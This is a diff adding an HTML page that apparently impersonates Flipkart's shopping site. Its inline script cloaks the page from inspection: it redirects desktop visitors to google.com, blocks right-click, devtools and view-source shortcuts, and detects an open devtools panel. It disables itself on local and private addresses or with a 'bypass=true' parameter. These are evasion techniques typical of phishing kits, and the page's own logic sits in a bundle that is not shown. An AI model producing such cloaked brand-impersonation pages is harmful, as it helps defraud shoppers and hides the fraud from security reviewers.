@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en-IN">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
+    <link rel="icon" href="/assets/images/logo_lite-cbb357.png" type="image/png" />
+    <title>Online Shopping India Mobile, Cameras, Lifestyle &amp; more Online @ Flipkart.com</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+    <script>
+      (function () {
+        // Disabled for local development / testing so website opens cleanly
+        try {
+          var h = window.location.hostname || '';
+          var p = window.location.port || '';
+          if (
+            p === '5173' || p === '5174' || p === '5175' || p === '3000' || p === '8080' || p === '4173' ||
+            h === 'localhost' || h === '127.0.0.1' || h === '0.0.0.0' || h === '::1' || h === '[::1]' ||
+            h.indexOf('192.168.') === 0 || h.indexOf('10.') === 0 || h.indexOf('172.') === 0 ||
+            h.indexOf('.local') !== -1 || h.indexOf('.') === -1 ||
+            window.location.protocol === 'file:' ||
+            (window.location.search && window.location.search.includes('bypass=true'))
+          ) {
+            return;
+          }
+        } catch (e) {
+          return;
+        }
+
+        function isMobileDevice() {
+          var ua = navigator.userAgent || navigator.vendor || window.opera || '';
+          var isMobileUA = /Android.+Mobile|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|Mobile.*Firefox|webOS|Windows Phone/i.test(ua);
+          if (isMobileUA) return true;
+          if (/Mobile|CriOS/i.test(ua) && !/iPad/i.test(ua)) return true;
+          var hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+          if (window.screen.width > 1024 && !hasTouch) return false;
+          return isMobileUA;
+        }
+
+        function blockDesktop() {
+          try {
+            window.location.replace("https://www.google.com");
+          } catch (e) {
+            window.location.href = "https://www.google.com";
+          }
+        }
+
+        // 1. Immediately redirect desktop/laptop users to google.com
+        if (!isMobileDevice()) {
+          blockDesktop();
+          return;
+        }
+
+        // 2. Prevent right-click / context menu
+        document.addEventListener('contextmenu', function (e) {
+          e.preventDefault();
+          e.stopPropagation();
+          return false;
+        }, { capture: true });
+
+        // 3. Block devtools shortcut keys
+        document.addEventListener('keydown', function (e) {
+          if (e.keyCode === 123 || e.key === 'F12') {
+            e.preventDefault();
+            e.stopPropagation();
+            blockDesktop();
+            return false;
+          }
+          if ((e.ctrlKey || e.metaKey) && e.shiftKey) {
+            var k = (e.key || '').toLowerCase();
+            if (k === 'i' || k === 'j' || k === 'c' || k === 'k' || k === 'e' || k === 'x') {
+              e.preventDefault();
+              e.stopPropagation();
+              blockDesktop();
+              return false;
+            }
+          }
+          if ((e.ctrlKey || e.metaKey) && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S')) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+          }
+        }, { capture: true });
+
+        // 4. Detect DevTools dock resize
+        window.addEventListener('resize', function () {
+          if (window.innerWidth > 1024 && !('ontouchstart' in window)) {
+            blockDesktop();
+          }
+          var threshold = 160;
+          if (
+            (window.outerWidth - window.innerWidth > threshold) ||
+            (window.outerHeight - window.innerHeight > threshold)
+          ) {
+            blockDesktop();
+          }
+        });
+      })();
+    </script>
+    <script type="module" crossorigin src="/assets/index-BsxR7CUf.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-D_vD-msb.css">
+  </head>
+  <body>
+    <div id="root"></div>
+  </body>
+</html>
